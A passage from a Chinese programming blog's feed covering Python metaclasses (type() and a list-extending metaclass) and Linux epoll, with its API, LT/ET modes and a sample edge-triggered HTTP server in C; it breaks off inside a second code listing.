<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">print</span> (type(s)) <span class="comment"># &lt;class '__main__.S'&gt;</span></div><div class="line"><span class="keyword">print</span> (type(S)) <span class="comment"># &lt;class 'type'&gt;</span></div></pre></td></tr></table></figure>
<p>可以看到s的类型是<code>Class S</code>，而S的类型是<code>type</code>，那么type是什么呢？</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">print(type(S)       <span class="comment"># &lt;class 'type'&gt;</span></div><div class="line">print(type(type))   <span class="comment"># &lt;class 'type'&gt;</span></div></pre></td></tr></table></figure>
<p>为什么class的类型是type？？</p>
<h1 id="2-理解type"><a href="#2-理解type" class="headerlink" title="2. 理解type"></a>2. 理解type</h1><p>动态语言和静态语言最大的不同，就是函数和类的定义，不是编译时定义的，而是运行时动态创建的。<br>事实上，我们说class也是对象，而这个对象是运行时动态创建的，创建class的方法就是使用type()函数。</p>
<p>我们可以打印出<strong><code>help(type)</code></strong> :<br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">Help on class type in module builtins:</div><div class="line"></div><div class="line">class type(object)</div><div class="line"> |  type(object_or_name, bases, dict)</div><div class="line"> |  type(object) -&gt; the object's type</div><div class="line"> |  type(name, bases, dict) -&gt; a new type</div><div class="line"> |</div><div class="line"> |  Methods defined here:</div><div class="line"> |</div><div class="line"> |  __call__(self, /, *args, **kwargs)</div><div class="line"> |      Call self as a function.</div><div class="line"> |</div><div class="line"> |  __delattr__(self, name, /)</div><div class="line"> |      Implement delattr(self, name).</div><div class="line"> |</div></pre></td></tr></table></figure></p>
<p>我们主要看<code>type(name, bases, dict)</code>这个方法，事实上当我们定义class的时候，就是调用此方法来创建class对象的。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_hello</span><span class="params">(self)</span>:</span></div><div class="line">    print(<span class="string">"say hello"</span>)</div><div class="line"></div><div class="line">name = <span class="string">'Student'</span>                    <span class="comment"># 类名</span></div><div class="line">bases = (object,)                   <span class="comment"># 父类集合</span></div><div class="line">attrs = &#123;<span class="string">'say_hello'</span> : say_hello&#125;   <span class="comment"># 类属性和方法</span></div><div class="line"></div><div class="line">Student = type(name, bases, attrs)</div><div class="line">s = Student()</div><div class="line">s.say_hello()</div></pre></td></tr></table></figure>
<p>等价于</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span><span class="params">(object)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">say_hello</span><span class="params">(self)</span>:</span></div><div class="line">        print(<span class="string">"say hello"</span>)</div><div class="line">s = Student()</div><div class="line">s.say_hello()</div></pre></td></tr></table></figure>
<h1 id="3-理解metaclass"><a href="#3-理解metaclass" class="headerlink" title="3. 理解metaclass"></a>3. 理解metaclass</h1><p>metaclass，直译为元类，metaclass允许你动态的控制类的创建行为。换句话说，你可以把类看成是metaclass创建出来的“实例”。  </p>
<p>因此我们可以<strong><code>先定义metaclass</code>，然后用<code>metaclass创建类</code>，最后用<code>类创建实例</code></strong>。  </p>
<p>我们先看一个简单的例子，这个metaclass可以给我们自定义的MyList增加一个add方法：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># 1. metaclass是类的模板，所以必须从`type`类型派生：</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">ListMetaclass</span><span class="params">(type)</span>:</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__new__</span><span class="params">(cls, name, bases, attrs)</span>:</span></div><div class="line">        attrs[<span class="string">'add'</span>] = <span class="keyword">lambda</span> self, value: self.append(value)</div><div class="line">        <span class="keyword">return</span> type.__new__(cls, name, bases, attrs)</div><div class="line"></div><div class="line"><span class="comment"># 2. 定义了metaclass，接下来我们要定义类，并指定用metaclass来创建：</span></div><div class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyList</span><span class="params">(list, metaclass=ListMetaclass)</span>:</span></div><div class="line">    <span class="keyword">pass</span></div></pre></td></tr></table></figure>
<p>当我们传入关键字参数metaclass时，它指示Python解释器在创建MyList时，要通过<code>ListMetaclass.__new__()</code>来创建，因此我们在<code>__new__()</code>函数里面修改类的定义，比如，加上新的方法，然后，返回修改后的定义。<br><code>__new__()</code>方法接收到的参数依次是：</p>
<ul>
<li>当前准备创建的类的对象</li>
<li>类的名字           </li>
<li>类继承的父类集合       </li>
<li>类的方法集合<br>即：<figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">cls ==&gt; `&lt;class '__main__.ListMetaclass'&gt;`</div><div class="line">name ==&gt; `MyList`</div><div class="line">bases ==&gt; (&lt;class 'list'&gt;,) </div><div class="line">attrs ==&gt; &#123;'__qualname__': 'MyList', '__module__': '__main__'&#125;</div></pre></td></tr></table></figure>
</li>
</ul>
<p>当返回后，我们可以测试一下MyList类是否有add()方法：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">L = MyList()</div><div class="line">L.add(<span class="number">1</span>)</div><div class="line">print(L)  </div><div class="line"></div><div class="line"><span class="comment">###### 输出 ######</span></div><div class="line">[<span class="number">1</span>]</div></pre></td></tr></table></figure></p>
<p>动态修改类行为有什么意义？直接在MyList定义中写上add()方法不是更简单吗？ 正常情况下，确实应该直接写，通过metaclass修改纯属变态。  </p>
<p>但是，总会遇到需要通过metaclass修改类定义的。ORM就是一个典型的例子。ORM全称“Object Relational Mapping”，即对象-关系映射。</p>
<p>如果做过java web的同学应当知道，<strong><code>Hibernate</code></strong>就是一个对象关系映射的框架。就是把关系数据库的一行映射为一个对象，也就是<strong>一个类对应一个表</strong>，这样，写代码更简单，不用直接操作SQL语句。</p>
<p>下一节，我们会学习如何用python来构建一个ORM框架。  </p>
<p>References:</p>
<ul>
<li><a href="http://stackoverflow.com/questions/100003/what-is-a-metaclass-in-python?answertab=active#tab-top" target="_blank" rel="external">StackOverflow</a></li>
<li><a href="http://www.liaoxuefeng.com/wiki/0014316089557264a6b348958f449949df42a6d3a2e542c000/0014319106919344c4ef8b1e04c48778bb45796e0335839000" target="_blank" rel="external">廖雪峰的教程</a></li>
</ul>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;在Python中，所有数据类型都可以视为对象，当然也可以自定义对象。自定义的对象数据类型就是面向对象中的类（’Class’）的概念。&lt;br&gt;类也是对象，可以把类看成是元类（’Metaclass’）创建出来的对象。&lt;/p&gt;
    
    </summary>
    
      <category term="Python进阶" scheme="https://maoao530.github.io/categories/Python%E8%BF%9B%E9%98%B6/"/>
    
    
      <category term="Python" scheme="https://maoao530.github.io/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>io-multiplexing-epoll</title>
    <link href="https://maoao530.github.io/2016/03/23/io-multiplexing-epoll/"/>
    <id>https://maoao530.github.io/2016/03/23/io-multiplexing-epoll/</id>
    <published>2016-03-22T16:31:00.000Z</published>
    <updated>2016-12-10T05:40:26.175Z</updated>
    
    <content type="html"><![CDATA[<p>什么是epoll？epoll是在2.6内核中提出的，是之前的select和poll的增强版本。它能显著提高程序在大量并发连接中只有少量活跃的情况下的系统CPU利用率。</p>
<a id="more"></a>
<h1 id="1-epoll的优点？"><a href="#1-epoll的优点？" class="headerlink" title="1. epoll的优点？"></a>1. epoll的优点？</h1><p>相对于select和poll来说，epoll有如下优点：</p>
<ul>
<li><p><strong>支持一个进程打开大数目的socket描述符</strong><br>  select 最不能忍受的是一个进程所打开的FD是有一定限制的，由FD_SETSIZE设置，默认值是1024。对于那些需要支持的上万连接数目的IM服务器来说显然太少了。这时候你一是可以选择修改这个宏然后重新编译服务器代码，不过资料也同时指出这样会带来网络效率的下降。</p>
</li>
<li><p><strong>IO效率不随FD数目增加而线性下降</strong><br>  传统的select/poll另一个致命弱点就是当你拥有一个很大的socket集合，不过由于网络延时，任一时间只有部分的socket是“活跃”的，但是select/poll每次调用都会线性扫描全部的集合，导致效率呈现线性下降。但是epoll不存在这个问题，它只会对“活跃”的socket进行操作—这是因为在内核实现中epoll是根据每个fd上面的callback函数实现的。那么，只有“活跃”的socket才会主动的去调用 callback函数，其他idle状态socket则不会</p>
</li>
<li><p><strong>使用mmap加速内核与用户空间的消息传递</strong><br>  无论是select,poll还是epoll都需要内核把FD消息通知给用户空间，如何避免不必要的内存拷贝就很重要，在这点上，epoll是通过内核与用户空间mmap同一块内存实现的。</p>
</li>
</ul>
<h1 id="2-epoll使用说明"><a href="#2-epoll使用说明" class="headerlink" title="2. epoll使用说明"></a>2. epoll使用说明</h1><p>先来看epoll的几个函数：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span>  </span></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_create</span><span class="params">(<span class="keyword">int</span> size)</span></span>;  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_ctl</span><span class="params">(<span class="keyword">int</span> epfd, <span class="keyword">int</span> op, <span class="keyword">int</span> fd, <span class="keyword">struct</span> epoll_event *event)</span></span>;  </div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">epoll_wait</span><span class="params">(<span class="keyword">int</span> epfd, <span class="keyword">struct</span> epoll_event * events, <span class="keyword">int</span> maxevents, <span class="keyword">int</span> timeout)</span></span>;</div></pre></td></tr></table></figure></p>
<ul>
<li><strong><code>int epoll_create(int size);</code></strong><br>创建一个epoll的句柄，size用来告诉内核这个监听的数目一共有多大。这个参数不同于select()中的第一个参数，给出最大监听的fd+1的值。需要注意的是，当创建好epoll句柄后，它就是会占用一个fd值，在linux下如果查看/proc/进程id/fd/，是能够看到这个fd的，所以在使用完epoll后，必须调用close()关闭，否则可能导致fd被耗尽。</li>
</ul>
<ul>
<li><strong><code>int epoll_ctl(int epfd, int op, int fd, struct epoll_event *event);</code></strong></li>
</ul>
<p>epoll的事件注册函数，它不同与select()是在监听事件时告诉内核要监听什么类型的事件，而是在这里先注册要监听的事件类型。</p>
<ul>
<li>第一个参数是epoll_create()的返回值</li>
<li>第二个参数表示动作,用三个宏来表示:<ul>
<li>EPOLL_CTL_ADD：注册新的fd到epfd中；</li>
<li>EPOLL_CTL_MOD：修改已经注册的fd的监听事件；</li>
<li>EPOLL_CTL_DEL：从epfd中删除一个fd；</li>
</ul>
</li>
</ul>
<p>第三个参数是需要监听的fd，第四个参数是告诉内核需要监听什么事。struct epoll_event结构如下：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="keyword">union</span> epoll_data &#123;  </div><div class="line">    <span class="keyword">void</span> *ptr;  </div><div class="line">    <span class="keyword">int</span> fd;  </div><div class="line">    <span class="keyword">__uint32_t</span> u32;  </div><div class="line">    <span class="keyword">__uint64_t</span> u64;  </div><div class="line">&#125; <span class="keyword">epoll_data_t</span>;  </div><div class="line">  </div><div class="line"><span class="keyword">struct</span> epoll_event &#123;  </div><div class="line">  <span class="keyword">__uint32_t</span> events;  <span class="comment">/* Epoll events */</span>  </div><div class="line">  <span class="keyword">epoll_data_t</span> data;  <span class="comment">/* User data variable */</span>  </div><div class="line">&#125;;  </div><div class="line">  </div><div class="line"><span class="comment">//events可以是以下几个宏的集合：  </span></div><div class="line">EPOLLIN ：表示对应的文件描述符可以读（包括对端SOCKET正常关闭）；  </div><div class="line">EPOLLOUT：表示对应的文件描述符可以写；  </div><div class="line">EPOLLPRI：表示对应的文件描述符有紧急的数据可读（这里应该表示有带外数据到来）；  </div><div class="line">EPOLLERR：表示对应的文件描述符发生错误；  </div><div class="line">EPOLLHUP：表示对应的文件描述符被挂断；  </div><div class="line">EPOLLET： 将EPOLL设为边缘触发(Edge Triggered)模式，这是相对于水平触发(Level Triggered)来说的。  </div><div class="line">EPOLLONESHOT：只监听一次事件，当监听完这次事件之后，如果还需要继续监听这个socket的话，需要再次把这个socket加入到EPOLL队列里</div></pre></td></tr></table></figure>
<ul>
<li><strong><code>int epoll_wait(int epfd, struct epoll_event * events, int maxevents, int timeout);</code></strong><br>　　<br>等待事件的产生，类似于select()调用。参数events用来从内核得到事件的集合，maxevents告之内核这个events有多大，这个maxevents的值不能大于创建epoll_create()时的size，参数timeout是超时时间（毫秒，0会立即返回，-1将不确定，也有说法说是永久阻塞）。该函数返回需要处理的事件数目，如返回0表示已超时。</li>
</ul>
<h1 id="3-epoll的两种模式LT和ET"><a href="#3-epoll的两种模式LT和ET" class="headerlink" title="3. epoll的两种模式LT和ET"></a>3. epoll的两种模式LT和ET</h1><p>二者的差异在于level-trigger模式下只要某个socket处于readable/writable状态，无论什么时候进行epoll_wait都会返回该socket；而edge-trigger模式下只有某个socket从unreadable变为readable或从unwritable变为writable时，epoll_wait才会返回该socket。<br>LT支持阻塞和非阻塞，ET只支持非阻塞，以避免由于一个文件句柄的阻塞读/阻塞写操作把处理多个文件描述符的任务饿死。</p>
<p><strong>返回EAGAIN或者EWOULDBLOCK错误，这个错误表示资源暂时不够，能read时，读缓冲区没有数据，或者write时，写缓冲区满了。</strong></p>
<p><strong>如果是阻塞socket，则会一直阻塞，直到能read或者能write。（当然如果你通过setsockopt设置了读写超时，超时时间到了还是会返回-1和EAGAIN，如果没有设置还是返回-1，则表示网络出错了）</strong></p>
<p><strong>如果是非阻塞socket，则会直接返回-1， 同时errno设置为EAGAIN</strong></p>
<p>所以，在epoll的ET模式下，正确的读写方式为:</p>
<blockquote>
<ul>
<li>读：只要可读，就一直读，直到返回0，或者 errno = EAGAIN</li>
<li>写:只要可写，就一直写，直到数据发送完，或者 errno = EAGAIN</li>
</ul>
</blockquote>
<h1 id="4-epoll-ET模式的简单HTTP服务器代码"><a href="#4-epoll-ET模式的简单HTTP服务器代码" class="headerlink" title="4. epoll,ET模式的简单HTTP服务器代码"></a>4. epoll,ET模式的简单HTTP服务器代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/wait.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/tcp.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/epoll.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sendfile.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;strings.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span> </span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX_EVENTS 10</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 8080</span></div><div class="line"></div><div class="line"><span class="comment">//设置socket连接为非阻塞模式</span></div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">setnonblocking</span><span class="params">(<span class="keyword">int</span> sockfd)</span> </span>&#123;</div><div class="line">    <span class="keyword">int</span> opts;</div><div class="line"></div><div class="line">    opts = fcntl(sockfd, F_GETFL);</div><div class="line">    <span class="keyword">if</span>(opts &lt; <span class="number">0</span>) &#123;</div><div class="line">        perror(<span class="string">"fcntl(F_GETFL)\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    opts = (opts | O_NONBLOCK);</div><div class="line">    <span class="keyword">if</span>(fcntl(sockfd, F_SETFL, opts) &lt; <span class="number">0</span>) &#123;</div><div class="line">        perror(<span class="string">"fcntl(F_SETFL)\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</div><div class="line">    <span class="keyword">struct</span> epoll_event ev, events[MAX_EVENTS];</div><div class="line">    <span class="keyword">int</span> addrlen, listenfd, conn_sock, nfds, epfd, fd, i, nread, n;</div><div class="line">    <span class="keyword">struct</span> sockaddr_in local, remote;</div><div class="line">    <span class="keyword">char</span> buf[BUFSIZ];</div><div class="line"></div><div class="line">    <span class="comment">//创建listen socket</span></div><div class="line">    <span class="keyword">if</span>( (listenfd = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>)) &lt; <span class="number">0</span>) &#123;</div><div class="line">        perror(<span class="string">"sockfd\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    setnonblocking(listenfd);</div><div class="line">    bzero(&amp;local, <span class="keyword">sizeof</span>(local));</div><div class="line">    local.sin_family = AF_INET;</div><div class="line">    local.sin_addr.s_addr = htonl(INADDR_ANY);;</div><div class="line">    local.sin_port = htons(PORT);</div><div class="line">    <span class="keyword">if</span>( bind(listenfd, (<span class="keyword">struct</span> sockaddr *) &amp;local, <span class="keyword">sizeof</span>(local)) &lt; <span class="number">0</span>) &#123;</div><div class="line">        perror(<span class="string">"bind\n"</span>);</div><div class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</div><div class="line">    &#125;</div><div class="line">    listen(listenfd, <span class="number">20</span>);</div><div class="line"></div><div class="line">    epfd = epoll_create(MAX_EVENTS);</div><div class="line">    <span class="keyword">if</span> (epfd == <span class="number">-1</span>) &#123;</div><div class="line">        perror(<span class="string">"epoll_create"</span>);</div><div class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    ev.events = EPOLLIN;</div><div class="line">    ev.data.fd = listenfd;</div><div class="line">    <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, listenfd, &amp;ev) == <span class="number">-1</span>) &#123;</div><div class="line">        perror(<span class="string">"epoll_ctl: listen_sock"</span>);</div><div class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (;;) &#123;</div><div class="line">        nfds = epoll_wait(epfd, events, MAX_EVENTS, <span class="number">-1</span>);</div><div class="line">        <span class="keyword">if</span> (nfds == <span class="number">-1</span>) &#123;</div><div class="line">            perror(<span class="string">"epoll_pwait"</span>);</div><div class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">        &#125;</div><div class="line"></div><div class="line">        <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; nfds; ++i) &#123;</div><div class="line">            fd = events[i].data.fd;</div><div class="line">            <span class="keyword">if</span> (fd == listenfd) &#123;</div><div class="line">                <span class="keyword">while</span> ((conn_sock = accept(listenfd,(<span class="keyword">struct</span> sockaddr *) &amp;remote, </div><div class="line">                                (<span class="keyword">size_t</span> *)&amp;addrlen)) &gt; <span class="number">0</span>) &#123;</div><div class="line">                    setnonblocking(conn_sock);</div><div class="line">                    ev.events = EPOLLIN | EPOLLET;</div><div class="line">                    ev.data.fd = conn_sock;</div><div class="line">                    <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_ADD, conn_sock,</div><div class="line">                                &amp;ev) == <span class="number">-1</span>) &#123;</div><div class="line">                        perror(<span class="string">"epoll_ctl: add"</span>);</div><div class="line">                        <span class="built_in">exit</span>(EXIT_FAILURE);</div><div class="line">                    &#125;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (conn_sock == <span class="number">-1</span>) &#123;</div><div class="line">                    <span class="keyword">if</span> (errno != EAGAIN &amp;&amp; errno != ECONNABORTED </div><div class="line">                            &amp;&amp; errno != EPROTO &amp;&amp; errno != EINTR) </div><div class="line">                        perror(<span class="string">"accept"</span>);</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">continue</span>;</div><div class="line">            &#125;  </div><div class="line">            <span class="keyword">if</span> (events[i].events &amp; EPOLLIN) &#123;</div><div class="line">                n = <span class="number">0</span>;</div><div class="line">                <span class="keyword">while</span> ((nread = read(fd, buf + n, BUFSIZ<span class="number">-1</span>)) &gt; <span class="number">0</span>) &#123;</div><div class="line">                    n += nread;</div><div class="line">                &#125;</div><div class="line">                <span class="keyword">if</span> (nread == <span class="number">-1</span> &amp;&amp; errno != EAGAIN) &#123;</div><div class="line">                    perror(<span class="string">"read error"</span>);</div><div class="line">                &#125;</div><div class="line">                ev.data.fd = fd;</div><div class="line">                ev.events = events[i].events | EPOLLOUT;</div><div class="line">                <span class="keyword">if</span> (epoll_ctl(epfd, EPOLL_CTL_MOD, fd, &amp;ev) == <span class="number">-1</span>) &#123;</div><div class="line">                    perror(<span class="string">"epoll_ctl: mod"</span>);</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">            <span class="keyword">if</span> (events[i].events &amp; EPOLLOUT) &#123;</div><div class="line">                <span class="built_in">sprintf</span>(buf, <span class="string">"HTTP/1.1 200 OK\r\nContent-Length: %d\r\n\r\nHello World"</span>, <span class="number">11</span>);</div><div class="line">                <span class="keyword">int</span> nwrite, data_size = <span class="built_in">strlen</span>(buf);</div><div class="line">                n = data_size;</div><div class="line">                <span class="keyword">while</span> (n &gt; <span class="number">0</span>) &#123;</div><div class="line">                    nwrite = write(fd, buf + data_size - n, n);</div><div class="line">                    <span class="keyword">if</span> (nwrite &lt; n) &#123;</div><div class="line">                        <span class="keyword">if</span> (nwrite == <span class="number">-1</span> &amp;&amp; errno != EAGAIN) &#123;</div><div class="line">                            perror(<span class="string">"write error"</span>);</div><div class="line">                        &#125;</div><div class="line">                        <span class="keyword">break</span>;</div><div class="line">                    &#125;</div><div class="line">                    n -= nwrite;</div><div class="line">                &#125;</div><div class="line">                close(fd);</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<h1 id="5-epoll-amp-LT-模式简单的服务器代码"><a href="#5-epoll-amp-LT-模式简单的服务器代码" class="headerlink" title="5. epoll &amp; LT 模式简单的服务器代码"></a>5. epoll &amp; LT 模式简单的服务器代码</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div><div class="line">116</div><div class="line">117</div><div class="line">118</div><div class="line">119</div><div class="line">120</div><div class="line">121</div><div class="line">122</div><div class="line">123</div><div class="line">124</div><div class="line">125</div><div class="line">126</div><div class="line">127</div><div class="line">128</div><div class="line">129</div><div class="line">130</div><div class="line">131</div><div class="line">132</div><div class="line">133</div><div class="line">134</div><div class="line">135</div><div class="line">136</div><div class="line">137</div><div class="line">138</div><div class="line">139</div><div class="line">140</div><div class="line">141</div><div class="line">142</div><div class="line">143</div><div class="line">144</div><div 